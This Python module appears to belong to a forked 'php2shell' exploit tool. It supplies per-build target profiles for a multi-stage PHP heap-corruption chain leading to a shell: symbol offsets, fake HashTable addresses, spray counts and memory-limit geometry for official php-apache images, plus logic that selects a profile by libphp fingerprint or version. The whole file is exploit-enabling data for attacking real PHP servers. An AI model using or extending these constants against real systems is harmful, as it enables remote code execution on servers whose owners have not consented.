#!/usr/bin/env python3
"""Per-build profiles for the php2shell chain.

The offsets and heap constants are properties of a compiled PHP build, not of
the version string alone.  Each profile below is pinned to one official
`php:<version>-apache` image; a package from another distribution can differ
even at the same version, so a profile match is a hypothesis, not a proof.

Values for 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11 are the ones published by the
cbovin/php2shell-poc lab (`poc.py`), cross-checked against the 8.4.26 offsets
this fork already used.
"""

from __future__ import annotations

import json
import os
from dataclasses import dataclass, replace


@dataclass(frozen=True)
class Profile:
    name: str
    version: str
    zif_offset: int
    dtor_offset: int
    htdata_offset: int
    stage1_n: int = 841
    stage2_t: int = 406
    stage2_v: int = 16
    stage3_pads: tuple[tuple[int, int], ...] = ((31, 31),) * 6
    stage3_carrier: bool = True
    in_band_leaks: bool = True
    image_digest: str = ""
    # Default carrier shape when no memory_limit geometry applies.  The 8.2
    # branch needs one extra bin-40 filler before the carrier (3 instead of 2)
    # even though its psv page is the same as 8.2.34's; see docs/research/fpm-128m.md.
    stage3_f_pads: int = 2
    # memory_limit-specific stage-3 geometry:
    # (limit_mb, a_extra, f_pads, htdata_offset, carrier_len, fill_len)
    stage3_geometry: tuple[tuple[int, int, int, int, int, int], ...] = ()
    # The stock-ini / display_errors=Off chain (docs/research/fpm-128m.md) is a different
    # strategy, not a different offset set: it does not use the warning-based
    # stage1, and it needs chunked bodies (no Content-Length) to clear
    # post_max_size.  pure128 marks builds where that chain was verified
    # end-to-end; --pure128 refuses to run when the selected profile has it off
    # (the heap constants would be guesses).
    pure128: bool = False
    # (session_http_vars_delta_from_main, zif_offset, spray_n1, spray_n2).
    # zif_offset is None when the chain uses profile.zif_offset; the separate
    # field exists because the callback offset is a build property that can
    # differ from the warning chain's.
    pure128_geometry: tuple[int, int | None, int, int] = (0xF8398, None, 500, 495)
    # Architecture of the build.  Symbol offsets and the libphp<->heap delta are
    # arch-specific; the heap geometry (S, hsv) is not (docs/research/t2-t3.md §P0-B).
    arch: str = "x86_64"
    # Address of php_ps_globals.  Used by tools/geo_cal.py so calibration works
    # on a stripped libphp (no debug symbols); PS(http_session_vars) is
    # ps_globals + psv_offset.  Measured with `nm -D libphp.so`.
    ps_globals_offset: int | None = None
    psv_offset: int = 0x168
    # (min, max) of libphp - main_chunk for the pure128 main-candidate filter.
    pure128_delta: tuple[int, int] = (0x1A00000, 0x1F00000)


PROFILES: dict[str, Profile] = {
    "8.2.12": Profile(
        name="8.2.12",
        version="8.2.12",
        # Derived on 2026-10-22 from php:8.2.12-apache (Debian 12 bookworm,
        # libphp sha256 689774cc…) with docker/offsets.py, not from a version
        # table: 8.2.12 and 8.2.34 differ by 0x2fe0 / 0x6e80.
        zif_offset=0x398EC0,
        dtor_offset=0x4807D0,
        # PS(http_session_vars) sits at ps_globals+0x140 (8.2 branch), not the
        # 0x168 used by the 8.4 gdb scripts.  The 8M geometry is the same page
        # as 8.2.34 (psv=chunk+0x56180, fake HashTable at chunk+0x740d8), but
        # the carrier needs 3 x 15-byte filler fields instead of 2.
        htdata_offset=0x740D8,
        in_band_leaks=False,
        stage3_f_pads=3,
        image_digest="sha256:8983699f10a9055f893b2c2f7f2c7c5a5da833b44967b25fe92bdf42b5821a72",
        stage3_geometry=((8, 0, 3, 0x740D8, 15, 15),),
        ps_globals_offset=0xF2E280,
        psv_offset=0x140,
    ),
    "8.2.34": Profile(
        name="8.2.34",
        version="8.2.34",
        zif_offset=0x39B8A0,
        dtor_offset=0x487650,
        htdata_offset=0x6A0D8,
        # 8.2 clears send_cookie after the producing request, so the in-band
        # cookie disclosure is unavailable; the local lab resolves the bases
        # from /proc/1/maps instead.
        in_band_leaks=False,
        image_digest="sha256:1650dcb528360aad05d6ed2f83cb403a2a39c31bd14552efd9a747b2207dea86",
        ps_globals_offset=0xF3A120,
        psv_offset=0x140,
    ),
    "8.3.35": Profile(
        name="8.3.35",
        version="8.3.35",
        zif_offset=0x3AC080,
        dtor_offset=0x49EC50,
        htdata_offset=0x6A0D8,
        image_digest="sha256:c59c808172ee3672cd334f8f2a5d7b1480a9d7273a368f412b8ee9b4ef418184",
        ps_globals_offset=0x10432A0,
        # NOT verified for 8.3: reading ps_globals+0x168 on php:8.3.35-apache
        # returns garbage (docs/research/fpm-128m.md §5).  geo_cal now refuses offsets < 0x1000
        # instead of reporting them as psv.  Do not trust this value until it is
        # measured properly (8.2=0x140, 8.4/8.5=0x168 are verified).
        psv_offset=0x168,
    ),
    "8.4.26": Profile(
        name="8.4.26",
        version="8.4.26",
        zif_offset=0x465370,
        dtor_offset=0x65EB60,
        htdata_offset=0x690D8,
        image_digest="sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a",
        ps_globals_offset=0x1316820,
        # Verified 2026-10-22 on the official trixie image with the stock
        # php.ini-production: display_errors=Off, memory_limit=128M,
        # post_max_size=8M, single worker.  6/6 proofs, 819 KB leak (docs/research/fpm-128m.md).
        pure128=True,
        # 16 MiB geometry, measured 2026-10-22 on the official trixie image
        # (same libphp sha256 as the 8M lab image): 29 x 7-byte fields in A move
        # PS(http_session_vars) to chunk+0x56fe0 (last bin-40 slot of page
        # 0x56); 48 x 15-byte fillers in B put the carrier there; the fake
        # HashTable copies land at chunk+0x740d8.
        stage3_geometry=((16, 29, 48, 0x740D8, 15, 15),
                         (32, 29, 48, 0x740D8, 15, 15),
                         (64, 29, 48, 0x740D8, 15, 15),
                         (128, 29, 48, 0x740D8, 15, 15),
                         (256, 29, 48, 0x740D8, 15, 15)),
    ),
    "8.5.11": Profile(
        name="8.5.11",
        version="8.5.11",
        zif_offset=0x5996E0,
        dtor_offset=0x7B47A0,
        htdata_offset=0x690D8,
        image_digest="sha256:47e6d8849049375e0d19e81f1b391ed88828d4653e0d1b00822185b66b564e8b",
        ps_globals_offset=0x1771A40,
    ),
}

# The author's self-compiled lab build (Apache 2.4.68).  Kept because the
# fork's older measurements and tools/ scripts target it.
# DEPRECATED / DO NOT USE FOR CALIBRATION.
# These constants come from an A-only measurement that was later refuted:
# adding any field to A moves psv, and the real (post-rotate) chain keeps
# psv at chunk+0x550a0 instead of the 0x73180 seen here (docs/research/t2-t3.md §0.8/§0.16,
# docs/research/t2-t3.md §3.1, docs/research/t2-t3.md §2).  Nothing in exploit.py reads them; they are kept
# only so old notes/scripts that import the names do not break.
# The 128M chunked stage-3 gap is tracked as T2 in docs/research/t2-t3.md §1 and docs/research/t2-t3.md §2.
# Do not re-run a_extra/f_pads/header-padding sweeps from these values.
CHUNKED_128M_A_EXTRA = 32
CHUNKED_128M_F_PADS = 53
CHUNKED_128M_HTDATA = 0x740D8

LAB_PROFILE = Profile(
    name="lab",
    version="8.4.26-lab",
    zif_offset=0x43A870,
    dtor_offset=0x613C50,
    htdata_offset=0x6E0D8,
    stage1_n=892,
    stage2_t=443,
    stage2_v=1,
    stage3_pads=((8, 7),) + ((7, 7),) * 5,
    stage3_carrier=False,
)

BUILD_DB = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                      "builds", "index.json")


def _profile_from_entry(entry: dict) -> "Profile":
    """Build a Profile from one builds/index.json entry.

    Symbol offsets always come from the entry (they are the fingerprint-keyed
    part).  Heap geometry is inherited from the same-version built-in profile
    when the entry does not record its own: builds/index.json was originally
    created for symbol offsets only, and dropping the geometry made a
    fingerprint match weaker than the plain version match (8.2.12 lost its
    f_pads=3 and stage3 failed).
    """
    inherited = PROFILES.get(entry.get("php_version", ""))
    geometry = []
    for item in entry.get("stage3_geometry", []):
        geometry.append((int(item[0]), int(item[1]), int(item[2]),
                         int(item[3], 0), int(item[4]), int(item[5])))
    if not geometry and inherited is not None:
        geometry = list(inherited.stage3_geometry)
    f_pads = int(entry.get("stage3_f_pads",
                           inherited.stage3_f_pads if inherited else 2))
    pure_geo = entry.get("pure128_geometry")
    if isinstance(pure_geo, (list, tuple)) and len(pure_geo) == 4:
        pure_geometry = (int(pure_geo[0]), pure_geo[1] if pure_geo[1] is None
                         else int(pure_geo[1], 0), int(pure_geo[2]),
                         int(pure_geo[3]))
    elif inherited is not None:
        pure_geometry = inherited.pure128_geometry
    else:
        pure_geometry = (0xF8398, None, 500, 495)
    psg = entry.get("ps_globals_offset")
    psv = entry.get("psv_offset")
    delta = entry.get("pure128_delta")
    if isinstance(delta, (list, tuple)) and len(delta) == 2:
        delta_range = (int(delta[0], 0), int(delta[1], 0))
    elif inherited is not None:
        delta_range = inherited.pure128_delta
    else:
        delta_range = (0x1A00000, 0x1F00000)
    return Profile(
        name=f"build:{entry['id']}",
        version=entry["php_version"],
        zif_offset=int(entry["zif_offset"], 0),
        dtor_offset=int(entry["dtor_offset"], 0),
        htdata_offset=int(entry["htdata_offset"], 0),
        in_band_leaks=bool(entry.get("in_band_leaks",
                                     inherited.in_band_leaks if inherited else True)),
        image_digest=entry.get("image_digest", ""),
        stage3_f_pads=f_pads,
        stage3_geometry=tuple(geometry),
        pure128=bool(entry.get("pure128",
                               inherited.pure128 if inherited else False)),
        pure128_geometry=pure_geometry,
        arch=entry.get("arch", inherited.arch if inherited else "x86_64"),
        ps_globals_offset=None if psg is None else int(psg, 0),
        psv_offset=int(psv, 0) if psv is not None else (
            inherited.psv_offset if inherited else 0x168),
        pure128_delta=delta_range,
    )


def external_builds() -> list["Profile"]:
    """Verified entries from builds/index.json.

    These are keyed by libphp fingerprint (sha256/build-id), not by version:
    the same PHP version from another distro has different symbol offsets.
    Entries without ``verified`` are ignored by automatic selection.
    """
    out: list["Profile"] = []
    try:
        with open(BUILD_DB, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, ValueError):
        return out
    for entry in data.get("builds", []):
        if not entry.get("verified"):
            continue
        try:
            out.append(_profile_from_entry(entry))
        except (KeyError, TypeError, ValueError):
            continue
    return out


def by_fingerprint(sha256: str = "", build_id: str = "") -> "Profile | None":
    """Look up a verified build by libphp sha256 or GNU build-id."""
    try:
        with open(BUILD_DB, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, ValueError):
        return None
    for entry in data.get("builds", []):
        if not entry.get("verified"):
            continue
        if ((sha256 and entry.get("libphp_sha256") == sha256)
                or (build_id and entry.get("build_id") == build_id)):
            try:
                return _profile_from_entry(entry)
            except (KeyError, TypeError, ValueError):
                return None
    return None


ALIASES = {"bookworm": "8.4.26"}


def resolve(name: str) -> Profile:
    """Resolve a CLI/profile-table name to a Profile."""
    key = ALIASES.get(name, name)
    if key == "lab":
        return LAB_PROFILE
    try:
        return PROFILES[key]
    except KeyError:
        raise SystemExit(
            f"unknown profile {name!r}; choose from auto, lab, "
            + ", ".join(PROFILES)
        ) from None


def exact(version: str | None) -> Profile | None:
    return PROFILES.get(version or "")


def same_branch(version: str | None) -> list[Profile]:
    if not version or version.count(".") < 2:
        return []
    branch = ".".join(version.split(".")[:2])
    return [p for p in PROFILES.values() if p.version.startswith(branch + ".")]


def candidates(version: str | None, allow_unknown: bool = False) -> list[Profile]:
    """Known builds to try, best match first."""
    ordered: list[Profile] = []
    hit = exact(version)
    versions: set[str] | None
    if hit:
        ordered.append(hit)
        versions = {hit.version}
    else:
        branch = same_branch(version)
        if branch:
            ordered.extend(p for p in branch if p not in ordered)
            versions = {p.version for p in branch}
        elif version or allow_unknown:
            ordered.extend(p for p in PROFILES.values() if p not in ordered)
            versions = None
        else:
            return []

    external = external_builds()
    if versions is None:
        ordered.extend(p for p in external if p not in ordered)
    else:
        ordered.extend(p for p in external
                       if p.version in versions and p not in ordered)
    return ordered


def with_offsets(base: Profile, zif: int, dtor: int,
                 htdata: int | None = None, name: str | None = None) -> Profile:
    """Derive a profile from measured symbols, keeping base heap constants."""
    return replace(
        base,
        name=name or f"derived:{base.name}",
        zif_offset=zif,
        dtor_offset=dtor,
        htdata_offset=base.htdata_offset if htdata is None else htdata,
    )
